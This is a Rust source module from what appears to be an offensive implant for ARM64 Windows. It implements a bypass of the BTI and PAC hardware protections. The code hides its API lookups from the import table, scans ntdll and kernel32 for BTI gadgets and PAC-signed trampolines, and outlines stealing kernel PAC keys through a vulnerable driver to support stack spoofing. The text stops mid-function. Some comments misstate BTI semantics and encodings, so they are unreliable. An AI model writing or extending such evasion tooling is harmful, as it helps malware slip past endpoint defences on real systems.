//! ARM64 BTI (Branch Target Identification) and PAC (Pointer Authentication
//! Code) bypass.
//!
//! # Overview
//!
//! ARM64 Windows uses two hardware mitigations that replace Intel CET on
//! ARM64 systems:
//!
//! - **BTI** (Branch Target Identification): ARM64's equivalent to CET IBT
//!   (Indirect Branch Tracking).  Indirect branch targets must start with a
//!   `BTI` instruction — the CPU raises a Branch Target Exception if they
//!   don't.  Controlled by `SCTLR_EL1.BTI`.
//!
//! - **PAC** (Pointer Authentication): Cryptographically signs return
//!   addresses and function pointers using 128-bit keys stored in system
//!   registers.  On function entry, the return address is signed with
//!   `PACIASP` (or `PACIBSP`).  On function exit, `AUTIASP` (or
//!   `AUTIBSP`) verifies the signature before returning.  If the signature
//!   is wrong, the CPU strips the PAC bits and the resulting pointer is
//!   invalid — causing a fault on use.
//!
//! # Why PAC Is Significantly Harder Than CET
//!
//! Intel CET shadow stacks store plaintext return addresses that can be:
//! 1. Written via the WRSS instruction (if CET is enabled in user mode)
//! 2. Manipulated via kernel memory access (BYOVD → KTHREAD shadow stack)
//! 3. Bypassed by building legitimate call chains through kernel32/ntdll
//!
//! PAC signatures are 16-bit codes derived from a 128-bit key and a 64-bit
//! context value using the QARMA5 algorithm.  Without the key:
//! - Cannot forge valid signatures (cryptographically infeasible)
//! - Cannot strip and re-sign pointers (AUT instructions verify before strip)
//! - Cannot predict collisions (2^16 PAC space, but brute-force is impractical
//!   during live execution; FPAC extension makes wrong PACs trap immediately)
//!
//! # Bypass Strategies
//!
//! 1. **PAC-valid trampoline routing** (most practical, no kernel access):
//!    Route calls through functions in system DLLs that already use PAC-signed
//!    pointers in their normal execution flow.  Each function in the chain
//!    signs its return address with `PACIASP` on entry and verifies it with
//!    `AUTIASP` on exit.  By calling through these functions, we piggy-back
//!    on their legitimate PAC flow.
//!
//! 2. **PAC key extraction via BYOVD** (requires kernel access):
//!    If a vulnerable driver is deployed (`kernel-callback` feature):
//!    a. Read PAC keys from the kernel's KTHREAD structure (offsets are
//!       build-specific, stored in `PAC_KEY_OFFSETS`).
//!    b. Use inline assembly `PACIA`/`PACDA` instructions to sign our own
//!       pointers with the extracted keys.
//!    c. This is the ARM64 equivalent of the CET shadow-stack fixup via BYOVD.
//!
//! 3. **BTI gadget scanning**:
//!    Find `BTI` instructions in system DLLs that are followed by useful
//!    gadgets (indirect branches we control).  Build a gadget database
//!    similar to the IBT ENDBR64 scanning on x86-64.
//!
//! # Integration with clean_call!
//!
//! On ARM64 Windows, `clean_call!` checks `prepare_spoofing()` which:
//! 1. If PAC inactive → Proceed (standard spoof_call)
//! 2. If PAC active + BYOVD keys available → sign pointer, Proceed
//! 3. If PAC active + no BYOVD → UseTrampoline (route through chain)
//! 4. If PAC active + no trampolines → Abort
//!
//! # Global State
//!
//! `PAC_STATE: AtomicU8` tracks runtime BTI/PAC status:
//! - `0` = PAC not present or not enforced
//! - `1` = PAC active, keys available (BYOVD)
//! - `2` = PAC active, trampoline-only (no kernel access)
//! - `3` = PAC active, no bypass possible
//!
//! Only effective when compiled with the `pac-bypass` feature (which implies
//! `direct-syscalls`).  Windows ARM64 only.

#![cfg(all(windows, feature = "pac-bypass", target_arch = "aarch64"))]

use std::sync::atomic::{AtomicBool, AtomicU8, Ordering};
use std::sync::OnceLock;

// ── State Constants ──────────────────────────────────────────────────────

/// PAC not present or not enforced on this system.
const PAC_INACTIVE: u8 = 0;

/// PAC active, keys available via BYOVD kernel access.
const PAC_ACTIVE_KEYS_AVAILABLE: u8 = 1;

/// PAC active, only trampoline routing available (no kernel access).
const PAC_ACTIVE_TRAMPOLINE_ONLY: u8 = 2;

/// PAC active, no bypass possible.
const PAC_ACTIVE_NO_BYPASS: u8 = 3;

// ── BTI Instruction Encodings ────────────────────────────────────────────
//
// ARM64 BTI instructions are encoded as system instructions:
//   BTI     = hint #32  = D503245F  (BTI c  — valid target for BR/BLR)
//   BTI j   = hint #36  = D503241F  (valid target for BLR only)
//   BTI jc  = hint #38  = D50324DF  (valid target for BLR and BR)
//
// On ARM64 Windows, the compiler typically emits `BTI c` at function
// entry points that may be indirect branch targets.  Note: `BTI c`
// accepts both BR (non-call indirect branch) and BLR (call indirect),
// so it is the most permissive form.
//
// For our purposes, any `BTI` instruction is a valid indirect branch
// target.  We scan for all three encodings.

/// BTI c  (hint #32) — valid target for BR and BLR.
const BTI_C_ENCODING: u32 = 0xD503245F;

/// BTI j  (hint #36) — valid target for BLR only.
const BTI_J_ENCODING: u32 = 0xD503241F;

/// BTI jc (hint #38) — valid target for BLR and BR.
const BTI_JC_ENCODING: u32 = 0xD50324DF;

/// PAC instructions used for signing/verifying pointers.
///
/// PACIASP: Sign LR with APIAKey, context=SP.  Used at function entry.
///   Encoding: D503233F
///
/// AUTIASP: Authenticate LR with APIAKey, context=SP.  Used at function exit.
///   Encoding: D50323BF
///
/// PACIA: Sign a general-purpose register with APIAKey and a context register.
///   Encoding: D5032101 (pacia xN, xM — varies by registers)
///
/// XPACI: Strip PAC from a pointer without authentication.
///   Encoding: D503205F (xpaci xN — varies by register)
const PACIASP_ENCODING: u32 = 0xD503233F;
const AUTIASP_ENCODING: u32 = 0xD50323BF;

// ── PAC Key Types ────────────────────────────────────────────────────────

/// The type of PAC key to use for signing.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u32)]
pub enum PacKeyType {
    /// APIAKey — used for signing return addresses (PACIASP/AUTIASP).
    /// The most commonly used key for function return-address signing.
    Apia = 0,
    /// APIBKey — secondary instruction key, rarely used directly.
    Apib = 1,
    /// APDAKey — data authentication key, used for signing data pointers.
    Apda = 2,
    /// APDBKey — secondary data key, rarely used directly.
    Apdb = 3,
}

/// Context value for PAC signing.
///
/// On ARM64 Windows, the standard signing contexts are:
/// - Return address signing: context = SP (stack pointer)
/// - Function pointer signing: context = the address of the pointer itself
#[derive(Debug, Clone, Copy)]
pub enum PacContext {
    /// Use the stack pointer as context (for return-address signing).
    StackPointer,
    /// Use an arbitrary 64-bit value as context.
    Custom(u64),
}

// ── Build-Specific PAC Key Offsets in KTHREAD ───────────────────────────
//
// ARM64 Windows stores the PAC keys in the _KTHREAD structure.  The keys
// are 128-bit values (two 64-bit halves).  The offsets vary by Windows
// build.  These offsets are verified against public PDB symbols.
//
// On ARM64 Windows 11:
//   _KTHREAD.ApiAKey is at different offsets per build
//   _KTHREAD.ApiBKey follows ApiAKey (+16)
//   _KTHREAD.ApdAKey follows ApiBKey (+16)
//   _KTHREAD.ApdBKey follows ApdAKey (+16)
//
// The keys are stored as pairs of u64 values (key_lo, key_hi).
//
// If the kernel-callback feature is not enabled or no driver is deployed,
// key extraction is unavailable and we fall back to trampoline routing.

/// PAC key offsets for different Windows ARM64 builds.
///
/// Each entry maps a minimum build number to the offset of `ApiAKey`
/// within `_KTHREAD`.  The other keys follow at +16, +32, +48.
///
/// Offsets verified against ARM64 Windows 11 public PDB symbols:
/// - Build 22000 (Win11 21H2): PAC keys at same offset as 22H2
/// - Build 22621 (Win11 22H2): PAC keys at known offsets
/// - Build 22631 (Win11 23H2): same as 22H2
/// - Build 26100 (Win11 24H2): offset shifted by +8
/// - Build 26120 (Win11 24H2 cumulative): same as 26100
///
/// For builds not in this table, the probing mechanism in
/// `probe_pac_key_offset` attempts to discover the correct offset
/// at runtime by scanning candidate ranges and validating the
/// extracted data with heuristic checks.
///
/// Without kernel access (BYOVD), the offsets are not used.
#[cfg(feature = "kernel-callback")]
const PAC_KEY_OFFSETS: &[(u32, usize)] = &[
    // (minimum_build, ApiAKey_offset_in_KTHREAD)
    // ARM64 Windows 11 21H2 — same KTHREAD layout as 22H2.
    (22000, 0x380),
    // ARM64 Windows 11 22H2+ — verified from public PDB symbols.
    (22621, 0x380),
    // ARM64 Windows 11 23H2 — same KTHREAD layout as 22H2.
    (22631, 0x380),
    // ARM64 Windows 11 24H2 — KTHREAD grew by 8 bytes before PAC keys.
    (26100, 0x388),
    // ARM64 Windows 11 24H2 cumulative update — same as base 24H2.
    (26120, 0x388),
];

// ── BTI Gadget Database ──────────────────────────────────────────────────

/// A single BTI-validated gadget found in a system DLL.
///
/// Each gadget is an indirect branch target that starts with a `BTI`
/// instruction, followed by useful instructions for call routing.
#[derive(Debug, Clone)]
pub struct BtiGadget {
    /// Virtual address of the BTI instruction.
    pub address: u64,
    /// The BTI encoding found (BTI c, BTI j, or BTI jc).
    pub bti_type: BtiType,
    /// Name of the DLL where the gadget was found (for diagnostics).
    pub source_dll: &'static str,
}

/// Type of BTI instruction found.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum BtiType {
    /// BTI c — accepts BR (indirect branch) and BLR (indirect call).
    BranchAndCall,
    /// BTI j — accepts BLR (indirect call) only.
    CallOnly,
    /// BTI jc — accepts BLR and BR.
    BranchAndCallJc,
}

impl std::fmt::Display for BtiType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::BranchAndCall => write!(f, "BTI c"),
            Self::CallOnly => write!(f, "BTI j"),
            Self::BranchAndCallJc => write!(f, "BTI jc"),
        }
    }
}

// ── PAC-Valid Trampoline ─────────────────────────────────────────────────

/// A PAC-valid trampoline: a function in a system DLL that:
/// 1. Signs its return address with PACIASP on entry
/// 2. Performs an indirect call through a register we control
/// 3. Returns through AUTIASP (validates the PAC signature)
///
/// These are found by scanning system DLLs for the pattern:
///   PACIASP
///   <prologue>
///   <loads a register from a controlled location>
///   BLR xN
///   <epilogue>
///   AUTIASP
///   RET
#[derive(Debug, Clone)]
pub struct PacTrampoline {
    /// Address of the trampoline function.
    pub address: u64,
    /// The register used for the indirect call (e.g., x8, x9).
    pub indirect_reg: u8,
    /// Name of the DLL where the trampoline was found.
    pub source_dll: &'static str,
    /// Offset of the BLR instruction within the trampoline.
    pub blr_offset: u32,
}

// ── Global State ─────────────────────────────────────────────────────────

/// Runtime PAC/BTI status of the agent process.
static PAC_STATE: AtomicU8 = AtomicU8::new(PAC_INACTIVE);

/// Whether the bypass module has been initialized.
static INITIALIZED: AtomicBool = AtomicBool::new(false);

/// Whether the bypass module is enabled (from config).
static BYPASS_ENABLED: AtomicBool = AtomicBool::new(false);

/// Whether to prefer trampoline routing over BYOVD key extraction.
static PREFER_TRAMPOLINE: AtomicBool = AtomicBool::new(true);

/// Whether to attempt BYOVD-based PAC key extraction.
static ATTEMPT_KEY_EXTRACTION: AtomicBool = AtomicBool::new(true);

/// Whether BTI gadget scanning has been performed.
static BTI_SCANNED: AtomicBool = AtomicBool::new(false);

/// Whether PAC keys have been extracted from the kernel.
static KEYS_EXTRACTED: AtomicBool = AtomicBool::new(false);

/// Cached Windows build number.
static CACHED_BUILD: OnceLock<u32> = OnceLock::new();

/// Cached BTI gadgets found in system DLLs.
static BTI_GADGETS: OnceLock<Vec<BtiGadget>> = OnceLock::new();

/// Cached PAC-valid trampolines found in system DLLs.
static PAC_TRAMPOLINES: OnceLock<Vec<PacTrampoline>> = OnceLock::new();

// ── Configuration ────────────────────────────────────────────────────────

/// Internal config mirror.
struct PacConfig {
    prefer_trampoline: bool,
    attempt_key_extraction: bool,
    scan_bti_gadgets: bool,
}

static PAC_CONFIG: OnceLock<PacConfig> = OnceLock::new();

// ── Public Types ─────────────────────────────────────────────────────────

/// Action to take for the caller, returned by `prepare_spoofing()`.
///
/// Mirrors `cet_bypass::CetAction` for consistency.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PacAction {
    /// PAC is not active — existing stack-spoofing is safe.
    Proceed,
    /// PAC is active and we have the keys — sign the pointer and proceed.
    SignAndProceed,
    /// PAC is active, no keys — use PAC-valid trampoline routing.
    UseTrampoline,
    /// PAC is active and cannot be bypassed — abort the operation.
    Abort,
}

// ── Initialization ───────────────────────────────────────────────────────

/// Initialize the BTI/PAC bypass module from agent config.
///
/// Must be called once during agent startup, before any injection or
/// stack-spoofing operations.  Detects the current PAC/BTI state and
/// stores configuration for runtime use.
pub fn init_from_config(config: &common::config::BtiPacConfig) {
    if INITIALIZED.swap(true, Ordering::SeqCst) {
        tracing::warn!("bti_pac_bypass: init_from_config called more than once, ignoring");
        return;
    }

    BYPASS_ENABLED.store(config.enabled, Ordering::SeqCst);
    PREFER_TRAMPOLINE.store(config.prefer_trampoline, Ordering::SeqCst);
    ATTEMPT_KEY_EXTRACTION.store(config.attempt_key_extraction, Ordering::SeqCst);

    let _ = PAC_CONFIG.set(PacConfig {
        prefer_trampoline: config.prefer_trampoline,
        attempt_key_extraction: config.attempt_key_extraction,
        scan_bti_gadgets: config.scan_bti_gadgets,
    });

    if !config.enabled {
        tracing::info!("bti_pac_bypass: module disabled by config");
        return;
    }

    // Cache the Windows build number.
    let build = crate::syscalls::get_build_number();
    let _ = CACHED_BUILD.set(build);

    tracing::info!(
        "bti_pac_bypass: init (enabled={}, prefer_trampoline={}, \
         attempt_key_extraction={}, scan_bti_gadgets={}, build={})",
        config.enabled,
        config.prefer_trampoline,
        config.attempt_key_extraction,
        config.scan_bti_gadgets,
        build,
    );

    // Detect PAC/BTI state.
    detect_pac_bti_state();

    let state = PAC_STATE.load(Ordering::SeqCst);

    // If configured, attempt key extraction via BYOVD.
    if state != PAC_INACTIVE
        && config.attempt_key_extraction
        && !PREFER_TRAMPOLINE.load(Ordering::SeqCst)
    {
        #[cfg(feature = "kernel-callback")]
        {
            if attempt_key_extraction() {
                tracing::info!("bti_pac_bypass: PAC keys extracted via BYOVD");
                PAC_STATE.store(PAC_ACTIVE_KEYS_AVAILABLE, Ordering::SeqCst);
                KEYS_EXTRACTED.store(true, Ordering::SeqCst);
            } else {
                tracing::warn!(
                    "bti_pac_bypass: PAC key extraction failed, falling back to trampoline routing"
                );
                PAC_STATE.store(PAC_ACTIVE_TRAMPOLINE_ONLY, Ordering::SeqCst);
            }
        }
        #[cfg(not(feature = "kernel-callback"))]
        {
            tracing::warn!(
                "bti_pac_bypass: key extraction requested but kernel-callback feature not enabled"
            );
            PAC_STATE.store(PAC_ACTIVE_TRAMPOLINE_ONLY, Ordering::SeqCst);
        }
    }

    // Scan for BTI gadgets if configured.
    if config.scan_bti_gadgets {
        scan_bti_gadgets_in_system_dlls();
        BTI_SCANNED.store(true, Ordering::SeqCst);
    }

    log_pac_state();
}

// ── Public API ───────────────────────────────────────────────────────────

/// Prepare for stack spoofing on ARM64.
///
/// This is the main entry point called from `syscalls.rs::clean_call!`
/// before any return-address manipulation.  Returns a `PacAction`
/// indicating what the caller should do.
///
/// - `Proceed` — PAC is not active, existing spoof_call code is safe.
/// - `SignAndProceed` — PAC is active but we have the keys; sign the
///   function pointer and proceed with spoof_call.
/// - `UseTrampoline` — PAC is active, use PAC-valid trampoline routing.
/// - `Abort` — PAC is active and cannot be bypassed.
pub fn prepare_spoofing() -> PacAction {
    if !BYPASS_ENABLED.load(Ordering::SeqCst) {
        return PacAction::Proceed;
    }

    match PAC_STATE.load(Ordering::SeqCst) {
        PAC_INACTIVE => PacAction::Proceed,
        PAC_ACTIVE_KEYS_AVAILABLE => {
            if PREFER_TRAMPOLINE.load(Ordering::SeqCst) {
                PacAction::UseTrampoline
            } else {
                PacAction::SignAndProceed
            }
        }
        PAC_ACTIVE_TRAMPOLINE_ONLY => PacAction::UseTrampoline,
        PAC_ACTIVE_NO_BYPASS => {
            tracing::error!("bti_pac_bypass: PAC is active and no bypass is available");
            PacAction::Abort
        }
        _ => {
            tracing::error!("bti_pac_bypass: unknown PAC state");
            PacAction::Abort
        }
    }
}

/// Check whether PAC/BTI bypass is enabled.
pub fn is_enabled() -> bool {
    BYPASS_ENABLED.load(Ordering::SeqCst)
}

/// Check whether PAC is currently active.
pub fn is_pac_active() -> bool {
    PAC_STATE.load(Ordering::SeqCst) != PAC_INACTIVE
}

/// Check whether BTI is active.
///
/// On ARM64 Windows, BTI enforcement is tied to the process mitigation
/// policy.  If PAC is active, BTI is likely also active (they are enabled
/// together as part of ARM64 hardware CFI).
pub fn is_bti_active() -> bool {
    // BTI and PAC are typically enabled together on ARM64 Windows.
    // A separate BTI check would require reading SCTLR_EL1.BTI, which
    // is only accessible from EL1 (kernel mode).
    is_pac_active()
}

/// Get the current PAC state as a string for diagnostics.
pub fn pac_state_str() -> &'static str {
    match PAC_STATE.load(Ordering::SeqCst) {
        PAC_INACTIVE => "inactive",
        PAC_ACTIVE_KEYS_AVAILABLE => "active-keys-available",
        PAC_ACTIVE_TRAMPOLINE_ONLY => "active-trampoline-only",
        PAC_ACTIVE_NO_BYPASS => "active-no-bypass",
        _ => "unknown",
    }
}

/// Get the current PAC state as a numeric value.
pub fn pac_state() -> u8 {
    PAC_STATE.load(Ordering::SeqCst)
}

/// Return JSON status string for the PAC/BTI bypass module.
pub fn status_json() -> String {
    let state = pac_state_str();
    let build = CACHED_BUILD.get().copied().unwrap_or(0);
    let initialized = INITIALIZED.load(Ordering::SeqCst);
    let bypass_enabled = BYPASS_ENABLED.load(Ordering::SeqCst);
    let keys_extracted = KEYS_EXTRACTED.load(Ordering::SeqCst);
    let bti_scanned = BTI_SCANNED.load(Ordering::SeqCst);
    let trampolines = PAC_TRAMPOLINES.get().map(|t| t.len()).unwrap_or(0);
    let gadgets = BTI_GADGETS.get().map(|g| g.len()).unwrap_or(0);

    format!(
        "{{\"pac_state\":\"{}\",\"build\":{},\"initialized\":{},\"bypass_enabled\":{},\
         \"keys_extracted\":{},\"bti_scanned\":{},\"trampolines\":{},\"bti_gadgets\":{}}}",
        state,
        build,
        initialized,
        bypass_enabled,
        keys_extracted,
        bti_scanned,
        trampolines,
        gadgets,
    )
}

// ── PAC/BTI Detection ────────────────────────────────────────────────────

/// Detect the PAC/BTI state of the agent process.
///
/// On ARM64 Windows, PAC availability is indicated by the CPU feature
/// registers (`ID_AA64ISAR1_EL1`).  However, these registers are only
/// accessible from EL1 (kernel mode), so we cannot read them directly.
///
/// Instead, we detect PAC enforcement by:
/// 1. Checking if the process has CFG (Control Flow Guard) enabled — PAC
///    enforcement is tied to CFG on ARM64 Windows.
/// 2. Checking if `IsProcessorFeaturePresent(PF_ARM_64BIT_POINTER_AUTH)`
///    returns TRUE.
/// 3. Checking the process mitigation policy for PAC-related flags.
fn detect_pac_bti_state() {
    let build = CACHED_BUILD.get().copied().unwrap_or(0);

    // ARM64 PAC is supported from Windows 10 20H1 (build 19041) but
    // hardware enforcement depends on the CPU.  On Windows 11 22H2+
    // (build 22621+), PAC is enforced on all ARM64 systems that support it.
    if build < 19041 {
        tracing::info!("bti_pac_bypass: build {} < 19041, PAC not supported", build);
        PAC_STATE.store(PAC_INACTIVE, Ordering::SeqCst);
        return;
    }

    // Try to detect PAC via IsProcessorFeaturePresent.
    // PF_ARM_64BIT_POINTER_AUTH = 34 (Windows SDK)
    const PF_ARM_64BIT_POINTER_AUTH: u32 = 34;

    let pac_available = check_processor_feature(PF_ARM_64BIT_POINTER_AUTH);

    if !pac_available {
        tracing::info!(
            "bti_pac_bypass: CPU does not support PAC (PF_ARM_64BIT_POINTER_AUTH = false)"
        );
        PAC_STATE.store(PAC_INACTIVE, Ordering::SeqCst);
        return;
    }

    tracing::info!("bti_pac_bypass: CPU supports PAC, checking enforcement status");

    // Check if PAC enforcement is active via process mitigation policy.
    // On ARM64 Windows, PAC enforcement is tied to CFG policy.
    if is_pac_enforced_via_policy() {
        tracing::info!("bti_pac_bypass: PAC is enforced via process mitigation policy");

        // Determine which bypass strategies are available.
        let has_kernel_access = cfg!(feature = "kernel-callback");
        if has_kernel_access && ATTEMPT_KEY_EXTRACTION.load(Ordering::SeqCst) {
            // Will attempt key extraction later during init.
            PAC_STATE.store(PAC_ACTIVE_TRAMPOLINE_ONLY, Ordering::SeqCst);
        } else {
            PAC_STATE.store(PAC_ACTIVE_TRAMPOLINE_ONLY, Ordering::SeqCst);
        }
    } else {
        tracing::info!("bti_pac_bypass: PAC supported but not enforced");
        PAC_STATE.store(PAC_INACTIVE, Ordering::SeqCst);
    }
}

/// Check a processor feature via `IsProcessorFeaturePresent`.
///
/// Resolved dynamically to avoid IAT entries.
fn check_processor_feature(feature: u32) -> bool {
    type FnIsProcessorFeaturePresent = unsafe extern "system" fn(u32) -> i32;

    let kernel32 = unsafe {
        match crate::syscalls::get_clean_api_addr("kernel32.dll", "IsProcessorFeaturePresent") {
            Ok(addr) => addr as usize,
            Err(_) => return false,
        }
    };

    let is_present: FnIsProcessorFeaturePresent = unsafe { std::mem::transmute(kernel32) };

    unsafe { is_present(feature) != 0 }
}

/// Check if PAC is enforced via process mitigation policy.
///
/// On ARM64 Windows, PAC enforcement is controlled by the CFG mitigation
/// policy.  If CFG is enabled, PAC return-address signing is enforced
/// for all code compiled with PAC support.
fn is_pac_enforced_via_policy() -> bool {
    // Query the CFG mitigation policy.  On ARM64, CFG implies PAC.
    // We reuse the same approach as the CET bypass: resolve
    // GetProcessMitigationPolicy dynamically and check the flags.

    type PVOID = *mut std::ffi::c_void;
    type HANDLE = PVOID;
    type DWORD = u32;
    type BOOL = i32;
    type SIZE_T = usize;
    type ProcessMitigationPolicy = u32;

    const PROCESS_CONTROL_FLOW_GUARD_POLICY: ProcessMitigationPolicy = 7;

    #[repr(C)]
    #[derive(Default)]
    struct ProcessMitigationControlFlowGuardPolicy {
        flags: DWORD,
    }

    // Try to resolve via pe_resolve hashes (same pattern as cet_bypass).
    let kernel32 =
        match unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) } {
            Some(b) => b,
            None => return false,
        };

    let get_policy_addr = match unsafe {
        pe_resolve::get_proc_address_by_hash(
            kernel32,
            pe_resolve::hash_str(b"GetProcessMitigationPolicy\0"),
        )
    } {
        Some(a) => a,
        None => return false,
    };

    type FnGetPolicy =
        unsafe extern "system" fn(HANDLE, ProcessMitigationPolicy, PVOID, SIZE_T) -> BOOL;

    let get_policy: FnGetPolicy = unsafe { std::mem::transmute(get_policy_addr) };

    let mut cfg_policy = ProcessMitigationControlFlowGuardPolicy::default();

    let result = unsafe {
        get_policy(
            (-1isize) as *mut _, // current process
            PROCESS_CONTROL_FLOW_GUARD_POLICY,
            &mut cfg_policy as *mut _ as PVOID,
            std::mem::size_of::<ProcessMitigationControlFlowGuardPolicy>() as SIZE_T,
        )
    };

    if result == 0 {
        // Failed to query — assume not enforced.
        tracing::debug!(
            "bti_pac_bypass: GetProcessMitigationPolicy failed, assuming PAC not enforced"
        );
        return false;
    }

    // CFG enabled (bit 0) implies PAC enforcement on ARM64.
    let cfg_enabled = cfg_policy.flags & 1 != 0;

    // On ARM64 Windows, there is an additional PAC-specific flag.
    // The exact bit depends on the Windows version, but CFG being enabled
    // is a reliable indicator that PAC is enforced.
    cfg_enabled
}

// ── BTI Gadget Scanning ──────────────────────────────────────────────────

/// Scan system DLLs for BTI-validated indirect branch targets.
///
/// Finds `BTI` instructions in loaded system DLLs that are valid
/// indirect branch targets.  Builds a gadget database similar to the
/// IBT ENDBR64 scanning on x86-64.
fn scan_bti_gadgets_in_system_dlls() {
    let mut gadgets = Vec::new();

    // Scan ntdll.dll — the primary target for indirect syscall gadgets.
    if let Some(ntdll) =
        unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) }
    {
        scan_dll_for_bti(ntdll, "ntdll.dll", &mut gadgets);
    }

    // Scan kernel32.dll — useful for API call routing.
    if let Some(kernel32) =
        unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) }
    {
        scan_dll_for_bti(kernel32, "kernel32.dll", &mut gadgets);
    }

    tracing::info!(
        "bti_pac_bypass: found {} BTI gadgets in system DLLs",
        gadgets.len()
    );

    let _ = BTI_GADGETS.set(gadgets);
}

/// Scan a single DLL for BTI instructions.
///
/// Walks the .text section of the PE image, looking for BTI instruction
/// encodings at 4-byte aligned offsets.
fn scan_dll_for_bti(dll_base: usize, dll_name: &'static str, gadgets: &mut Vec<BtiGadget>) {
    // Read DOS header to find PE offset.
    let dos_header = dll_base as *const u8;
    let pe_offset = unsafe { *(dos_header.add(0x3C) as *const u32) } as usize;

    // Verify PE signature.
    let pe_sig = unsafe { &*(dos_header.add(pe_offset) as *const [u8; 4]) };
    if pe_sig != b"PE\0\0" {
        return;
    }

    // Read COFF header.
    let num_sections = unsafe { *(dos_header.add(pe_offset + 6) as *const u16) } as usize;
    let optional_header_size = unsafe { *(dos_header.add(pe_offset + 20) as *const u16) } as usize;

    // Section headers start after the optional header.
    let sections_offset = pe_offset + 4 + 20 + optional_header_size;

    for i in 0..num_sections {
        let section_offset = sections_offset + i * 40;
        let section_ptr = unsafe { dos_header.add(section_offset) };

        // Read section name.
        let name = std::str::from_utf8(unsafe { &*(section_ptr as *const [u8; 8]) })
            .unwrap_or("")
            .trim_end_matches('\0');

        if name != ".text" {
            continue;
        }

        let virtual_size = unsafe { *(section_ptr.add(8) as *const u32) } as usize;
        let virtual_address = unsafe { *(section_ptr.add(12) as *const u32) } as usize;

        // Scan for BTI instructions at 4-byte aligned offsets.
        let text_start = dll_base + virtual_address;
        let text_size = virtual_size;

        // Limit scan to first 256 KB for performance.
        let scan_limit = std::cmp::min(text_size, 256 * 1024);

        for offset in (0..scan_limit.saturating_sub(4)).step_by(4) {
            let insn = unsafe { *((text_start + offset) as *const u32) };

            let bti_type = if insn == BTI_C_ENCODING {
                Some(BtiType::BranchAndCall)
            } else if insn == BTI_J_ENCODING {
                Some(BtiType::CallOnly)
            } else if insn == BTI_JC_ENCODING {
                Some(BtiType::BranchAndCallJc)
            } else {
                None
            };

            if let Some(bti_type) = bti_type {
                gadgets.push(BtiGadget {
                    address: (text_start + offset) as u64,
                    bti_type,
                    source_dll: dll_name,
                });

                // Stop after finding enough gadgets from this DLL.
                if gadgets.len() >= 256 {
                    return;
                }
            }
        }

        // Only scan .text.
        break;
    }
}

/// Get the BTI gadgets found during scanning.
pub fn bti_gadgets() -> &'static [BtiGadget] {
    BTI_GADGETS.get().map(|g| g.as_slice()).unwrap_or(&[])
}

// ── PAC Trampoline Discovery ─────────────────────────────────────────────

/// Scan system DLLs for PAC-valid trampolines.
///
/// A PAC-valid trampoline is a function that:
/// 1. Starts with PACIASP (signs the return address)
/// 2. Contains a BLR instruction (indirect call via register)
/// 3. Ends with AUTIASP + RET (validates PAC and returns)
///
/// These functions allow us to route calls through them while maintaining
/// PAC integrity — the AUTIASP at the end will validate the PAC that was
/// placed by PACIASP at the beginning.
pub fn discover_pac_trampolines() -> Vec<PacTrampoline> {
    let mut trampolines = Vec::new();

    // Scan ntdll.dll and kernel32.dll for PAC-valid trampolines.
    if let Some(ntdll) =
        unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) }
    {
        scan_dll_for_pac_trampolines(ntdll, "ntdll.dll", &mut trampolines);
    }

    if let Some(kernel32) =
        unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) }
    {
        scan_dll_for_pac_trampolines(kernel32, "kernel32.dll", &mut trampolines);
    }

    tracing::info!(
        "bti_pac_bypass: found {} PAC-valid trampolines",
        trampolines.len()
    );

    let _ = PAC_TRAMPOLINES.set(trampolines.clone());
    trampolines
}

/// Scan a DLL for PAC-valid trampolines.
///
/// Looks for function prologue/epilogue patterns:
///   PACIASP           (entry — signs LR with SP as context)
///   <prologue>        (typical: stp x29,x30,[sp,#-N]!)
///   ...               (function body)
///   BLR xN            (indirect call through register)
///   ...
///   <epilogue>        (typical: ldp x29,x30,[sp],#N)
///   AUTIASP           (exit — verifies LR PAC)
///   RET
fn scan_dll_for_pac_trampolines(
    dll_base: usize,
    dll_name: &'static str,
    trampolines: &mut Vec<PacTrampoline>,
) {
    // Read PE headers to find .text section.
    let dos_header = dll_base as *const u8;
    let pe_offset = unsafe { *(dos_header.add(0x3C) as *const u32) } as usize;
    let pe_sig = unsafe { &*(dos_header.add(pe_offset) as *const [u8; 4]) };
    if pe_sig != b"PE\0\0" {
        return;
    }

    let num_sections = unsafe { *(dos_header.add(pe_offset + 6) as *const u16) } as usize;
    let optional_header_size = unsafe { *(dos_header.add(pe_offset + 20) as *const u16) } as usize;
    let sections_offset = pe_offset + 4 + 20 + optional_header_size;

    for i in 0..num_sections {
        let section_offset = sections_offset + i * 40;
        let section_ptr = unsafe { dos_header.add(section_offset) };
        let name = std::str::from_utf8(unsafe { &*(section_ptr as *const [u8; 8]) })
            .unwrap_or("")
            .trim_end_matches('\0');

        if name != ".text" {
            continue;
        }

        let virtual_size = unsafe { *(section_ptr.add(8) as *const u32) } as usize;
        let virtual_address = unsafe { *(section_ptr.add(12) as *const u32) } as usize;
        let text_start = dll_base + virtual_address;

        // Scan window size for trampoline detection.
        // Typical ARM64 function is 32-256 instructions.
        const SCAN_WINDOW: usize = 64; // 64 instructions = 256 bytes

        // Limit scan to first 512 KB for performance.
        let scan_limit = std::cmp::min(virtual_size, 512 * 1024);

        for offset in (0..scan_limit.saturating_sub(SCAN_WINDOW * 4)).step_by(4) {
            let func_start = text_start + offset;
            let first_insn = unsafe { *(func_start as *const u32) };

            // Must start with PACIASP.
            if first_insn != PACIASP_ENCODING {
                continue;
            }

            // Scan the window for BLR and AUTIASP + RET patterns.
            let mut found_blr = false;
            let mut blr_offset = 0u32;
            let mut blr_reg = 0u8;
            let mut found_autiasp_ret = false;

            for j in 1..SCAN_WINDOW {
                let insn = unsafe { *((func_start + j * 4) as *const u32) };

                // Check for AUTIASP + RET (ret must follow immediately).
                if insn == AUTIASP_ENCODING {
                    let next_insn = unsafe { *((func_start + (j + 1) * 4) as *const u32) };
                    if next_insn == 0xD65F03C0 {
                        // RET
                        found_autiasp_ret = true;
                        break;
                    }
                }

                // Check for BLR xN (encoding: D63F0C01 | (Rn << 5))
